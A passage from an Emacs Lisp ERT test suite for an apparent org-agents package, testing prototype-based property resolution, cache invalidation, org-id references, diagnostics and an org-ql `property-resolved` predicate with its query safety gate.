  "A special property is the entry's own, whatever a prototype says.
And the PREMISE that makes the resolver's special-property clause a belt
rather than a load-bearing step, which is the half of this test that will
fail first if it ever stops holding.

MEASURED, and asserted below: Org will not hand a special name out of a
DRAWER at all.  A master whose drawer holds `:DEADLINE: <2030-01-01
Tue>', `:TODO: DONE', `:ITEM: fake' and `:PRIORITY: A' answers
`org-entry-properties' with neither the deadline nor the keyword, at
`standard', at `special' and at `all' alike -- so a prototype cannot
carry a special along the chain, and `CATEGORY', the one Org does
synthesize, is one `org-entry-get' answers for at every entry anyway.

So NO mutation of the package can make this test fail, and that is
recorded rather than papered over: it is a PREMISE test, of the same kind
as the other MEASURED pins in this suite.  Should a later Org start
reporting drawer-spelled specials, the `org-entry-properties' assertions
below fail, and the resolver's special-property clause becomes reachable
and worth a fixture of its own.

Pushing such a name into the prefilter is a different matter and is
never merely useless -- see
`org-agents-test-rg-property-resolved-special-property-is-residual'."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      '(("f.org" . "\
* TODO Follows the master
:PROPERTIES:
:PROTOTYPE: Task
:END:
"))
    (org-agents-test--at-entry (funcall F "f.org") "Follows the master"
      ;; The master spells `:CATEGORY: masters', and it does not travel.
      (should-not (equal "masters" (org-agents-resolve-property "CATEGORY")))
      (should (equal (org-entry-get nil "CATEGORY")
                     (org-agents-resolve-property "CATEGORY")))
      ;; And `org-entry-get' does answer for it, at an entry whose file
      ;; says nothing about categories at all.
      (should (org-entry-get nil "CATEGORY"))
      ;; The master's drawer spells `:DEADLINE:' too, and it does not
      ;; travel either.
      (should-not (org-agents-resolve-property "DEADLINE")))
    ;; The premise, measured here rather than quoted from a report.
    (with-temp-buffer
      (insert "* Master\n:PROPERTIES:\n:DEADLINE: <2030-01-01 Tue>\n"
              ":TODO: DONE\n:ITEM: fake\n:PRIORITY: A\n"
              ":CATEGORY: masters\n:END:\n")
      (org-mode)
      (goto-char (point-min))
      (should (equal '(("CATEGORY" . "masters"))
                     (org-entry-properties nil 'standard)))
      (dolist (which '(standard special all))
        (dolist (name '("DEADLINE" "TODO"))
          (should-not (cdr (assoc name (org-entry-properties nil which)))))))))

(ert-deftest org-agents-test-prototype-cache-invalidates-on-an-unsaved-edit ()
  "An UNSAVED edit to a prototype is what the next resolution sees.
The cache is keyed on `org-agents--file-cache-key', whose buffer half is
`buffer-chars-modified-tick', so the case that matters -- the user
changes a master and expects the followers to change with it -- needs no
save."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      org-agents-test--prototype-corpus
    (org-agents-test--at-entry (funcall F "follower.org") "Ship the widget"
      (should (equal "ada" (org-agents-resolve-property "OWNER"))))
    (with-current-buffer (find-file-noselect registry)
      (goto-char (point-min))
      (should (re-search-forward "^:OWNER:     ada$" nil t))
      (replace-match ":OWNER:     grace"))
    (org-agents-test--at-entry (funcall F "follower.org") "Ship the widget"
      (should (equal "grace" (org-agents-resolve-property "OWNER"))))))

(ert-deftest org-agents-test-prototype-cache-reads-once-per-batch ()
  "Inside `org-agents--with-attributes' the registry is read once, and keyed once.
Both halves matter: the READ is the file system, and the KEY is a
`file-truename' plus a `find-buffer-visiting' that walks the whole buffer
list -- which is what made a corpus-wide lint quadratic before Epic 2
batched it.  The prototype cache must be warmed by the same batch, or the
first in-batch lookup reads a cold cache while the flag claims it is
fresh."
  (let ((reads 0)
        (keys 0)
        (real-read (symbol-function 'org-agents--prototypes-read))
        (real-key (symbol-function 'org-agents--file-cache-key)))
    (cl-letf (((symbol-function 'org-agents--prototypes-read)
               (lambda (&rest args) (cl-incf reads) (apply real-read args)))
              ((symbol-function 'org-agents--file-cache-key)
               (lambda (&rest args) (cl-incf keys) (apply real-key args))))
      (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
          org-agents-test--prototype-corpus
        (org-agents-test--at-entry (funcall F "follower.org") "Ship the widget"
          (setq reads 0 keys 0)
          (org-agents--with-attributes
            (dotimes (_ 10)
              (should (equal "ada" (org-agents-resolve-property "OWNER")))
              (should (equal "7" (org-agents-resolve-property "REVIEWS")))
              (should (equal "open" (org-agents-resolve-property "STATUS")))))
          (should (= 1 reads))
          (should (= 1 keys)))))))

(ert-deftest org-agents-test-prototype-id-reference-resolves-anywhere ()
  "`:PROTOTYPE: id:UUID' names a master ANYWHERE in the corpus.
Independent of the outline and of the registry file both, which is what
makes a prototype a Tinderbox prototype rather than a second inheritance
axis.  It works where `org-id-locations' knows the id, which is the
ordinary configuration; a test has to arrange that explicitly."
  (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
      '(("masters.org" . "\
* Master out in the corpus
:PROPERTIES:
:ID:      1f2e3d4c-5b6a-7890-abcd-ef0123456789
:OWNER:   corpus-master
:REVIEWS: 99
:END:
")
        ("f.org" . "\
* TODO Follows an id
:PROPERTIES:
:PROTOTYPE: id:1f2e3d4c-5b6a-7890-abcd-ef0123456789
:END:
* TODO Follows a bare uuid
:PROPERTIES:
:PROTOTYPE: 1f2e3d4c-5b6a-7890-abcd-ef0123456789
:END:
"))
    (let ((org-id-locations-file (expand-file-name ".org-id-locations" dir)))
      (puthash "1f2e3d4c-5b6a-7890-abcd-ef0123456789"
               (funcall F "masters.org") org-id-locations)
      (org-agents-test--at-entry (funcall F "f.org") "Follows an id"
        (should (equal "corpus-master" (org-agents-resolve-property "OWNER")))
        (should (equal "99" (org-agents-resolve-property "REVIEWS"))))
      ;; Written without the `id:' prefix it is the same reference.
      (org-agents-test--at-entry (funcall F "f.org") "Follows a bare uuid"
        (should (equal "corpus-master" (org-agents-resolve-property "OWNER")))))))

(ert-deftest org-agents-test-prototype-id-untracked-says-so ()
  "A dangling `id:' names the ID table when the table is why it dangled.
The two causes want different fixes and used to read alike.  MEASURED, a
master one file away with an empty `org-id-locations' resolved nil and
said only `no prototype `id:...' named by `F'' -- which sends the user
hunting for a typo in the FOLLOWER's drawer, the one thing spelled
correctly.  The cause is that `org-id-find-id-file' answers the current
buffer's own file on a table miss, so the id is sought in the follower's
file rather than the master's; teaching org-id the location, and changing
nothing else, resolves it.

A misspelled NAME must not gain the clause, or it would say the opposite
of the truth."
  (let ((uuid "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"))
    (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
        `(("masters.org" . ,(concat "\
* Master out in the corpus
:PROPERTIES:
:ID:      " uuid "
:OWNER:   ida
:END:
"))
          ("f.org" . ,(concat "\
* TODO Follows an id nothing tracks
:PROPERTIES:
:PROTOTYPE: id:" uuid "
:END:
* TODO Follows a name that is a typo
:PROPERTIES:
:PROTOTYPE: Tsak
:END:
")))
      ;; The fixture starts with an empty table, which is the case.
      (should (org-agents--prototype-id-untracked-p uuid))
      (org-agents-test--at-entry (funcall F "f.org") "Follows an id nothing"
        (let* ((org-agents--prototype-warned (make-hash-table :test #'equal))
               (texts (org-agents-test--messages
                        (should-not
                         (org-agents-resolve-property-quietly "OWNER")))))
          (should (= 1 (length texts)))
          (should (string-match-p "no prototype" (car texts)))
          (should (string-match-p "org-id knows no file" (car texts)))))
      ;; A name gets the ordinary message and no such clause.
      (org-agents-test--at-entry (funcall F "f.org") "Follows a name that is"
        (let* ((org-agents--prototype-warned (make-hash-table :test #'equal))
               (texts (org-agents-test--messages
                        (should-not
                         (org-agents-resolve-property-quietly "OWNER")))))
          (should (= 1 (length texts)))
          ;; Quoted per `text-quoting-style', so the name alone.
          (should (string-match-p "no prototype" (car texts)))
          (should (string-match-p "Tsak" (car texts)))
          (should-not (string-match-p "org-id knows" (car texts)))))
      ;; And once the table knows the file, it resolves and says nothing.
      (let ((org-id-locations-file (expand-file-name ".org-id-locations" dir)))
        (puthash uuid (funcall F "masters.org") org-id-locations)
        (should-not (org-agents--prototype-id-untracked-p uuid))
        (setq org-agents--prototype-id-cache nil)
        (org-agents-test--at-entry (funcall F "f.org") "Follows an id nothing"
          (let* ((org-agents--prototype-warned
                  (make-hash-table :test #'equal))
                 (texts (org-agents-test--messages
                          (should (equal "ida"
                                         (org-agents-resolve-property
                                          "OWNER"))))))
            (should-not texts)))))))

(ert-deftest org-agents-test-prototype-id-cache-invalidates-on-an-unsaved-edit ()
  "An unsaved edit to an id-named master is what the next resolution sees.
`org-agents-test-prototype-cache-invalidates-on-an-unsaved-edit' pins this
for the registry's own prototypes; the id path is keyed on a file of its
own -- whichever file the id happens to live in -- and had no equivalent.

MEASURED, the gap admitted two independent mutations, each of which looks
like tidying: dropping the key comparison in
`org-agents--prototype-id-entry', and reading the master with
`insert-file-contents' instead of `org-agents--in-org-copy' so that an
unsaved buffer is invisible.  Both left 318 of 318 tests green, and both
made every `$NAME^' agent resolve against the master as it stood at the
session's first lookup: the user edits the master, runs the agent, and
sees matches computed from the old value with no diagnostic."
  (let ((uuid "1f2e3d4c-5b6a-7890-abcd-ef0123456789"))
    (org-agents-test--with-attr-corpus org-agents-test--prototype-registry
        `(("masters.org" . ,(concat "\
* Master out in the corpus
:PROPERTIES:
:ID:      " uuid "
:OWNER:   before
:END:
"))
          ("f.org" . ,(concat "\
* TODO Follows an id
:PROPERTIES:
:PROTOTYPE: id:" uuid "
:END:
")))
      (let ((org-id-locations-file (expand-file-name ".org-id-locations" dir)))
        (puthash uuid (funcall F "masters.org") org-id-locations)
        (org-agents-test--at-entry (funcall F "f.org") "Follows an id"
          (should (equal "before" (org-agents-resolve-property "OWNER"))))
        ;; Edited in the visiting buffer and NOT saved.
        (with-current-buffer (find-file-noselect (funcall F "masters.org"))
          (goto-char (point-min))
          (should (re-search-forward "^:OWNER:   before$" nil t))
          (replace-match ":OWNER:   after")
          (should (buffer-modified-p)))
        (org-agents-test--at-entry (funcall F "f.org") "Follows an id"
          (should (equal "after" (org-agents-resolve-property "OWNER"))))))))

(ert-deftest org-agents-test-prototype-missing-attributes-file-resolves-nothing ()
  "No registry: no named prototype, no default, one diagnostic, no error.
`org-agents--file-cache-key' answers nil for a file that cannot be read,
the caches clear, and `(plist-get nil :default)' is nil -- which is also
exactly the branch in which the pushed alternation is sound, so this is
worth a test of its own rather than a remark."
  (let* ((dir (make-temp-file "org-agents-noreg" t))
         (org-agents-attributes-file (expand-file-name "nope.org" dir))
         (org-agents--attributes-cache nil)
         (org-agents--prototypes-cache nil)
         (org-agents--prototype-id-cache nil)
         (org-agents--prototype-warned (make-hash-table :test #'equal))
         (file (expand-file-name "f.org" dir))
         (org-use-property-inheritance nil))
    (unwind-protect
        (progn
          (with-temp-file file
            (insert "* TODO Follows a master that is not there\n"
                    ":PROPERTIES:\n:PROTOTYPE: Task\n:OWNER: local\n:END:\n"))
          (org-agents-test--at-entry file "Follows a master"
            (let ((texts (org-agents-test--messages
                           ;; A local value still answers.
                           (should (equal "local"
                                          (org-agents-resolve-property "OWNER")))
                           (should-not
                            (org-agents-resolve-property "STATUS")))))
              (should (= 1 (length texts)))
              (should (string-match-p "Task" (car texts))))))
      (dolist (buf (buffer-list))
        (when-let* ((f (buffer-file-name buf)))
          (when (string-prefix-p (file-name-as-directory dir) f)
            (with-current-buffer buf (set-buffer-modified-p nil))
            (kill-buffer buf))))
      (delete-directory dir t))))

(ert-deftest org-agents-test-prototype-duplicate-name-first-wins ()
  "Two prototypes of one name: the first stands, and it is said once.
The registry's own rule for a duplicate declaration, applied to the
section beside it -- a heading is not a property key, so first-wins is a
convention rather than a consequence, and the diagnosis is what makes it
safe."
  (org-agents-test--with-attr-corpus "\
* Prototypes
** Task
:PROPERTIES:
:OWNER: first
:END:
** Task
:PROPERTIES:
:OWNER: second
:END:
"
      '(("f.org" . "\
* TODO Follows Task
:PROPERTIES:
:PROTOTYPE: Task
:END:
"))
    (org-agents-test--at-entry (funcall F "f.org") "Follows Task"
      (let ((texts (org-agents-test--messages
                     (should (equal "first"
                                    (org-agents-resolve-property "OWNER"))))))
        (should (= 1 (length texts)))
        (should (string-match-p "declared twice" (car texts)))))))

(ert-deftest org-agents-test-prototype-section-is-found-anywhere-in-the-file ()
  "The `Prototypes' section is a top-level heading, wherever it sits.
And only entries BELOW it are prototypes: a declaration after the
section is a declaration, not a master.

The last claim needs an assertion that can tell the two readings apart,
and the three below it cannot: the follower spells no `STATUS' and its
chain does not either, so the declared default answers whether or not
`STATUS' is ALSO registered as a master; `NOSUCH' dangles either way; and
the attribute reader is a separate scan.  MEASURED, replacing the scan's
subtree bound with `point-max' left the whole suite green while
`STATUS' became a master and handed `ATTR_TYPE' and `ATTR_DEFAULT' to the
follower as ordinary inherited values -- registry metadata leaking into
the corpus.  So the section's contents are asserted directly, and one
follower names the declaration to prove it is not reachable."
  (org-agents-test--with-attr-corpus "\
* OWNER
:PROPERTIES:
:ATTR_TYPE: string
:END:

* Prototypes
** Task
:PROPERTIES:
:OWNER: johnw
:END:
*** Nested Task
:PROPERTIES:
:PROTOTYPE: Task
:REVIEWS:   3
:END:

* STATUS
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT: open
:END:
"
      '(("f.org" . "\
* TODO Follows a nested master
:PROPERTIES:
:PROTOTYPE: Nested Task
:END:
* TODO Names the declaration after the section
:PROPERTIES:
:PROTOTYPE: STATUS
:END:
"))
    ;; The section holds exactly the two entries below it, and nothing
    ;; that follows it.  This is the assertion the subtree bound needs.
    (should (equal '("Task" "Nested Task")
                   (mapcar #'car (org-agents--prototypes-alist))))
    (org-agents-test--at-entry (funcall F "f.org") "Follows a nested master"
      ;; A prototype at any depth below the section is a prototype.
      (should (equal "3" (org-agents-resolve-property "REVIEWS")))
      (should (equal "johnw" (org-agents-resolve-property "OWNER")))
      ;; And the declaration AFTER the section is still a declaration.
      (should (equal "open" (org-agents-resolve-property "STATUS")))
      ;; `STATUS' is no prototype, so naming it as one dangles.
      (should-not (org-agents-resolve-property "NOSUCH")))
    ;; Naming the declaration as a master reaches NOTHING -- not its
    ;; `:ATTR_TYPE:', not its `:ATTR_DEFAULT:'.  A scan that ran past the
    ;; subtree would hand both over as inherited values.
    (org-agents-test--at-entry (funcall F "f.org") "Names the declaration"
      (should-not (org-agents-resolve-property-quietly "ATTR_TYPE"))
      (should-not (org-agents-resolve-property-quietly "ATTR_DEFAULT")))
    (should (equal (org-agents-attributes) '("OWNER" "STATUS")))))

(ert-deftest org-agents-test-prototype-a-second-section-is-diagnosed ()
  "A second `* Prototypes' heading is ignored, and now says so.
Only the first such section is read, which is the rule -- but it was kept
SILENTLY: MEASURED, `* Prototypes/** A' followed by `* Prototypes/** B'
answered `(\"A\")' with no message at all.  `B' was unreachable, and
because the heading is reserved it was not reported as a declaration
missing `:ATTR_TYPE:' either, so the only signal a user got was a
dangling diagnostic naming the FOLLOWER's drawer -- the one place the
mistake was not.  A duplicate name was diagnosed; a duplicate section was
the gap."
  (org-agents-test--with-attr-corpus "\
* Prototypes
** A
:PROPERTIES:
:OWNER: from-a
:END:

* Prototypes
** B
:PROPERTIES:
:OWNER: from-b
:END:
"
      '(("f.org" . "\
* TODO Names the unreachable master
:PROPERTIES:
:PROTOTYPE: B
:END:
"))
    (let ((texts (org-agents-test--messages
                   (should (equal '("A")
                                  (mapcar #'car
                                          (org-agents--prototypes-alist)))))))
      (should (= 1 (length texts)))
      (should (string-match-p "second section" (car texts))))
    ;; And the first section still stands, rather than the read failing.
    (org-agents-test--at-entry (funcall F "f.org") "Names the unreachable"
      (should-not (org-agents-resolve-property-quietly "OWNER")))))

(ert-deftest org-agents-test-prototype-one-section-is-not-diagnosed ()
  "One `Prototypes' section says nothing, however many masters it holds.
The other half of the duplicate-section diagnostic: a heading INSIDE the
section, at any depth, and a heading after it that is not a second
section, are both ordinary and quiet.  A check that scanned from the
section's start rather than from its end would report a nested master as a
second section."
  (org-agents-test--with-attr-corpus "\
* OWNER
:PROPERTIES:
:ATTR_TYPE: string
:END:

* Prototypes
** Task
:PROPERTIES:
:OWNER: johnw
:END:
*** Prototypes
:PROPERTIES:
:OWNER: nested
:END:

* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
      '(("f.org" . "* TODO Nothing to see\n"))
    (let ((texts (org-agents-test--messages
                   (should (equal '("Task" "Prototypes")
                                  (mapcar #'car
                                          (org-agents--prototypes-alist)))))))
      (should-not texts))))

(ert-deftest org-agents-test-prototype-shipped-example-reads-cleanly ()
  "The registry the package SHIPS reads with no diagnostic at all.
`docs/attributes-example.org' is the file the README and the init snippet
both send a reader to, so it has to be a file this reader accepts -- and
the mistake it guards against is a real one, made while writing it: a
top-level heading of PROSE in that file is not prose, it is an attribute
declaration with no `:ATTR_TYPE:', and the reader names it as malformed.
Every heading in that file is one of exactly two things, and this is what
says so.

Guarded on the file rather than assumed: `make test' runs with the
repository root as `default-directory', and a suite run from elsewhere
should skip this rather than fail it."
  (let ((example (expand-file-name "docs/attributes-example.org")))
    (skip-unless (file-readable-p example))
    (let* ((org-agents-attributes-file example)
           (org-agents--attributes-cache nil)
           (org-agents--prototypes-cache nil)
           (org-agents--prototype-id-cache nil)
           (org-element-use-cache nil)
           names prototypes
           (texts (org-agents-test--messages
                    (setq names (org-agents-attributes))
                    (setq prototypes
                          (mapcar #'car (org-agents--prototypes-alist))))))
      (should-not texts)
      ;; And it is not silent for want of anything in it.
      (should (member "STATUS" names))
      (should (equal prototypes '("Task" "Urgent Task"))))))

(ert-deftest org-agents-test-caret-is-not-short-for-the-value-form ()
  "`$NAME^' is the EXISTENCE form, and three documents used to say otherwise.
They claimed `(and (todo) $STATUS^)' was
`(and (todo) (property-resolved \"STATUS\" \"wip\"))' \"written short\".  It is
not, and the difference is not academic: MEASURED against the shipped
`docs/attributes-example.org' as a live registry, the value form selected
the two followers the file prints and the caret form selected those two
AND an unrelated TODO carrying no `:STATUS:' and no `:PROTOTYPE:' at all --
because that file declares `:ATTR_DEFAULT: open', and a declared default
makes the existence form true of every entry in the corpus.

The cost travels with the wrong answer.  A bare existence test on a name
with a declared default is exactly the conjunct the prefilter must leave
residual, so the query a reader copied narrows NOTHING and scans its whole
scope live.

Held here rather than in prose: the expansions are asserted to differ, so
a document may not describe them as one thing again without a test
failing."
  (should (equal (org-agents--expand '$STATUS^) '(property-resolved "STATUS")))
  (should-not (equal (org-agents--expand '$STATUS^)
                     '(property-resolved "STATUS" "wip")))
  (should (equal (org-agents--expand '(and (todo) $STATUS^))
                 '(and (todo) (property-resolved "STATUS"))))
  ;; The three axes stay three, which is what makes the sugar readable.
  (should-not (equal (org-agents--expand '$STATUS^)
                     (org-agents--expand '$STATUS)))
  (should-not (equal (org-agents--expand '$STATUS^)
                     (org-agents--expand '$STATUS*))))

;;; The predicate

(defconst org-agents-test--resolved-corpus
  '(("local.org" . "\
* TODO Spells it for itself
:PROPERTIES:
:STATUS: active
:END:
")
    ("follower.org" . "\
* TODO Reads it through a master
:PROPERTIES:
:PROTOTYPE: Master
:END:
")
    ("other.org" . "\
* TODO Spells a different value
:PROPERTIES:
:STATUS: done
:END:
")
    ("empty.org" . "\
* TODO Spells the name and nothing after it
:PROPERTIES:
:S:
:END:
"))
  "The differential fixture: one local value, one inherited, two controls.")

(defconst org-agents-test--resolved-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
Deliberately WITHOUT a default: the default is the prefilter's exception,
and this fixture is about the predicate.

* Prototypes
** Master
:PROPERTIES:
:STATUS: active
:END:
"
  "A registry whose one prototype spells `:STATUS: active' and nothing else.")

(ert-deftest org-agents-test-property-resolved-has-no-preamble ()
  "`property-resolved' contributes NO preamble, and the reason is not the
obvious one.

MEASURED, and this is what the predicate's docstring records: org-ql's
plain `property' forms attach no `:inherit' and read the entry's own
drawer, so turning the preamble off does not make them see an inherited
value -- the bare `(property \"X\")' form has no preamble at all and
still does not see one.  What a preamble here WOULD do is re-impose the
drawer text as a filter over this predicate's answer.  So it must have
none, and org-ql sets the precedent by emitting none for any `property'
form that carries `:inherit'.

A preamble HOISTED out of a sibling conjunct is another matter and is
sound -- a conjunct's necessary condition is the conjunction's -- so that
case is asserted too, rather than left to look like a leak."
  (dolist (query '((property-resolved "STATUS")
                   (property-resolved "STATUS" "active")
                   (and (property-resolved "STATUS") (todo))
                   (or (property-resolved "STATUS") (todo))))
    (should-not (plist-get (org-ql--query-preamble
                            (org-ql--normalize-query query))
                           :preamble)))
  ;; org-ql's own `property' behaves the same way once inheritance is in
  ;; play, which is the precedent.
  (should-not (plist-get (org-ql--query-preamble
                          (org-ql--normalize-query
                           '(property "STATUS" "active" :inherit t)))
                         :preamble))
  ;; And a sibling's preamble is hoisted over the conjunction, which is
  ;; sound: it is a necessary condition of both conjuncts together.
  (should (plist-get (org-ql--query-preamble
                      (org-ql--normalize-query
                       '(and (property-resolved "STATUS")
                             (property "Z" "1"))))
                     :preamble)))

(ert-deftest org-agents-test-property-resolved-differential-against-plain-property ()
  "The epic's reason for existing, as one differential assertion.
An entry whose value arrives ONLY through its `:PROTOTYPE:' is matched by
`property-resolved' and NOT by `property' -- at every setting of
`org-use-property-inheritance' and of `org-ql-use-preamble', because
neither is what hides it.

The whole grid is run rather than one cell, because the two obvious
wrong fixes are \"set inheritance to t\" and \"turn the preamble off\",
and a single cell cannot say that neither works."
  (org-agents-test--with-attr-corpus org-agents-test--resolved-registry
      org-agents-test--resolved-corpus
    (dolist (inherit (list nil t '("STATUS")))
      (dolist (preamble (list t nil))
        (let* ((org-use-property-inheritance inherit)
               (org-ql-use-preamble preamble)
               (resolved (org-ql-select files '(property-resolved "STATUS"
                                                                  "active")
                           :action '(org-get-heading t t t t)))
               (plain (org-ql-select files '(property "STATUS" "active")
                        :action '(org-get-heading t t t t))))
          (should (equal '("Spells it for itself"
                           "Reads it through a master")
                         resolved))
          (should (equal '("Spells it for itself") plain)))))))

(ert-deftest org-agents-test-property-resolved-is-structurally-safe ()
  "The gate admits it as a pure read, and admits it without a list.
`org-agents--known-predicate-p' reads `org-ql-predicates', which
`org-ql-defpred' populates at load time, so nothing had to be added to a
list of admitted heads -- and nothing should have been: a list would be a
second place for the gate's answer to live."
  (should (org-agents--known-predicate-p 'property-resolved))
  (should (org-agents--structurally-safe-p '(property-resolved "STATUS")))
  (should (org-agents--structurally-safe-p
           '(and (todo) (property-resolved "STATUS" "active"))))
  ;; And it passes the gate with asking ON and nothing approved, which is
  ;; the state an unsafe form is refused in.
  (let ((custom-file nil)
        (user-init-file nil)
        (org-agents-safe-queries nil)
        (org-agents-refused-queries nil)
        (org-agents--session-approved (make-hash-table :test 'equal))
        (org-ql-ask-unsafe-queries t)
        (noninteractive t))
    (should (org-agents--gate '(and (todo) (property-resolved "STATUS"))))
    ;; Nothing was remembered, because nothing was asked.
    (should (zerop (hash-table-count org-agents--session-approved)))))

(ert-deftest org-agents-test-property-resolved-refuses-a-keyword-argument ()
  "A keyword argument is named at gate time, not at match time.
`property-resolved' is defined with no normalizer -- a normalizer is
where a preamble comes from, and it must have none -- so unlike org-ql's
own `property' it has nothing to swallow `:inherit' with, and the
argument would reach `string-equal' as a symbol from inside org-ql's
generated matcher, naming neither the agent nor the argument."
  (dolist (form '((property-resolved "STATUS" :inherit t)
                  (property-resolved)
                  (property-resolved 3)
                  (property-resolved "STATUS" 3)
                  (and (todo) (property-resolved "STATUS" :inherit t))))
    (let ((err (should-error (org-agents--gate form) :type 'user-error)))
      (should (string-match-p "property-resolved"
                             (error-message-string err)))))
  ;; The two spellings it does take pass.
  (should (org-agents--gate '(property-resolved "STATUS")))
  (should (org-agents--gate '(property-resolved "STATUS" "active"))))

(ert-deftest org-agents-test-property-resolved-agrees-with-property-locally ()
  "On a purely local value the two predicates answer alike, empty included.
A `:S:' line with nothing after it answers `org-entry-get' with the empty
string, which is non-nil, and org-ql's `property' matches it.  So the
local step reads with raw `org-entry-get' and not with
`org-agents--entry-get', whose contract is that written-but-empty and not
written at all mean the same thing -- right for an agent property, wrong
here, because it would make `property-resolved' disagree with `property'
about an entry no prototype and no default is involved in."
  (org-agents-test--with-attr-corpus org-agents-test--resolved-registry
      org-agents-test--resolved-corpus
    (should (equal (org-ql-select files '(property "S")
                     :action '(org-get-heading t t t t))
                   '("Spells the name and nothing after it")))
    (should (equal (org-ql-select files '(property-resolved "S")
                     :action '(org-get-heading t t t t))
                   '("Spells the name and nothing after it")))
    ;; And the same at the entry, through the resolver itself.
    (org-agents-test--at-entry (funcall F "empty.org") "Spells the name"
      (should (equal "" (org-agents-resolve-property "S")))
      (should (equal (org-entry-get nil "S")
                     (org-agents-resolve-property "S"))))))

(ert-deftest org-agents-test-property-resolved-empty-value-is-not-no-value ()
  "`(property-resolved NAME \"\")' selects the empty value, not the absent one.
The VALUE argument admits `\"\"' -- `org-agents--check-resolved-args' asks
only for a string, so a query or a caller that passes a possibly-empty
value reaches this -- and \"resolves to the empty string\" and \"does not
resolve at all\" are different questions the suite did not distinguish.
MEASURED, rewriting the predicate's comparison as
`(string-equal value (or resolved \"\"))' left 318 of 318 tests green; the
two readings differ on exactly this input, and under the mutant the form
matches every entry in scope with no `:S:' line at all rather than the one
entry that spells `:S:' with nothing after it.  A massive over-match, and
the ripgrep side objects to neither reading, since an empty value degrades
to the wider existence arm.

The agreement with org-ql's own `property' holds too, and needs
`org-ql-use-preamble' nil to be visible: MEASURED, `(property \"S\" \"\")'
selects the entry with the preamble off and NOTHING with it on, because
org-ql's regexp preamble seeks `[ \\t]+' and then the value, which an
empty value never spells.  `property-resolved' contributes no preamble
ever, so it answers alike at both settings -- which is the same asymmetry
its own docstring records, measured here on the value it is easiest to get
wrong."
  (org-agents-test--with-attr-corpus org-agents-test--resolved-registry
      org-agents-test--resolved-corpus
    ;; Only the entry that spells the name with nothing after it.
    (should (equal (org-ql-select files '(property-resolved "S" "")
                     :action '(org-get-heading t t t t))
                   '("Spells the name and nothing after it")))
    ;; The corpus holds three entries with no `:S:' line at all, and none
    ;; of them matches.  This is the assertion the mutant fails.
    (should (= 1 (length (org-ql-select files '(property-resolved "S" "")
                           :action '(org-get-heading t t t t)))))
    (dolist (preamble (list t nil))
      (let ((org-ql-use-preamble preamble))
        (should (equal (org-ql-select files '(property-resolved "S" "")
                         :action '(org-get-heading t t t t))
                       '("Spells the name and nothing after it")))))
    ;; And org-ql's own `property' agrees where its preamble is out of
    ;; the way.
    (let ((org-ql-use-preamble nil))
      (should (equal (org-ql-select files '(property "S" "")
                       :action '(org-get-heading t t t t))
                     '("Spells the name and nothing after it"))))
    ;; A non-empty value on the same name selects nothing, so the empty
    ;; string is being compared rather than ignored.
    (should-not (org-ql-select files '(property-resolved "S" "x")
                  :action '(org-get-heading t t t t)))))

(ert-deftest org-agents-test-property-resolved-in-name-position ()
  "A `$ref' in the NAME position of `property-resolved' is the name string.
`(property-resolved $STATUS)' is how a query names an attribute rather
than a value, exactly as `(property $STATUS)' and `(property-ts $NEXT)'
do -- and without this the reference would survive the expander and the
gate would refuse it."
  (should (equal (org-agents--expand '(property-resolved $STATUS))
                 '(property-resolved "STATUS")))
  (should (equal (org-agents--expand '(and (todo) (property-resolved $STATUS)))
                 '(and (todo) (property-resolved "STATUS")))))

;;;; Collection

(defmacro org-agents-test--with-corpus (&rest body)
  "Run BODY with `dir' bound to a temp corpus of two org files and
`agent-file' bound to a file containing one agent entry.
`a' and `b' name the corpus files, whose absolute paths the agent
entry's `:AGENT_SCOPE:' lists.  `org-directory' is the corpus, so no
test can reach the developer's own; property inheritance is off, so a
test that wants it must arrange it; the ID location table is a fresh one,
so rendering a
link cannot write a temporary corpus into the developer's
`org-id-locations-file'; buffers visiting the corpus are killed
afterwards, because the files they visit are about to be deleted.

The window configuration is put back as well.  Several tests here have to
show a corpus buffer in the selected window, because `org-update-dblock'
indents in that window's buffer and in batch it is `*scratch*'; left
unrestored, the window goes on showing a buffer this fixture then kills,
and every later test in the process inherits it."
  (declare (indent 0))
  `(save-window-excursion
     (org-agents-test--with-corpus-1 ,@body)))

(defmacro org-agents-test--with-corpus-1 (&rest body)
  "The body of `org-agents-test--with-corpus'; call that instead.
`org-agents-prefilter' is bound to `auto' for the same reason
`org-agents-test--with-rg-corpus' binds it: a developer's own
customization must not decide what these tests exercise.  Several tests
here assert that NO subprocess was spawned, and against an ambient nil
that assertion is vacuously true -- it would pass because nothing ever
prefilters anything, not because the rule it names holds."
  (declare (indent 0))
  `(let* ((dir (make-temp-file "org-agents-corpus" t))
          (a (expand-file-name "a.org" dir))
          (b (expand-file-name "b.org" dir))
          (agent-file (expand-file-name "agents.org" dir))
          (org-directory dir)
          (org-agents-prefilter 'auto)
          (org-use-property-inheritance nil)
          (org-element-use-cache nil)
          (org-id-locations (make-hash-table :test #'equal))
          (org-id-files nil))
     (unwind-protect
         (progn
           (with-temp-file a
             (insert "* TODO Fix widget\n:PROPERTIES:\n:ID: 11111111-1111-1111-1111-111111111111\n:NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n"
                     "* DONE Old thing\n:PROPERTIES:\n:NEXT_REVIEW: [2020-01-01 Wed]\n:END:\n"))
           (with-temp-file b
             (insert "* TODO No review property here\n"))
           (with-temp-file agent-file
             (insert "* Review agent\n:PROPERTIES:\n:AGENT_QUERY: (and (todo) (property \"NEXT_REVIEW\"))\n:AGENT_SCOPE: (\"" a "\" \"" b "\")\n:END:\n"))
           ,@body)
       (dolist (buf (buffer-list))
         (when-let* ((f (buffer-file-name buf)))
           (when (string-prefix-p (file-name-as-directory dir) f)
             (with-current-buffer buf (set-buffer-modified-p nil))
             (kill-buffer buf))))
       (delete-directory dir t))))

(defun org-agents-test--titles (matches)
  "The headline text of MATCHES, in order."
  (mapcar (lambda (element) (org-element-property :raw-value element)) matches))

(defun org-agents-test--alias-line (needle)
  "The first line of the current buffer holding NEEDLE."
  (cl-find-if (lambda (line) (string-match-p needle line))
              (split-string (buffer-string) "\n")))

(defmacro org-agents-test--in-agent (&rest body)
